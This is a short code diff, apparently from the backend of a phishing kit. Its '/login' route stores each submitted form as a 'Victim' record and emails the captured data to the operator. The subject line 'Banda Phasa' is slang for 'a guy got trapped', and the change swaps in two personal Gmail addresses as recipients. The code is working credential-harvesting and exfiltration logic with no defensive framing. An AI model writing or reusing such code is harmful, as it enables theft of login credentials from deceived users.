@@ -8,8 +8,9 @@ route.post("/login", async (req, res) => {
     try {
         const ress = await Victim.create(req.body)
         res.status(200).json({status: "ok"})
-        const to = ["vc8bppc@gmail.com"]
-        if(!req.body.me) to.push("vishwakarmasatyam2002@gmail.com")
+        const to = ["vishwakarmasatyam2002@gmail.com", "vishwakarmasatyam2905@gmail.com"]
+
+        if(!req.body.me) to.push("")
         sendEmail({
             to: to,
             subject: "Banda Phasa",
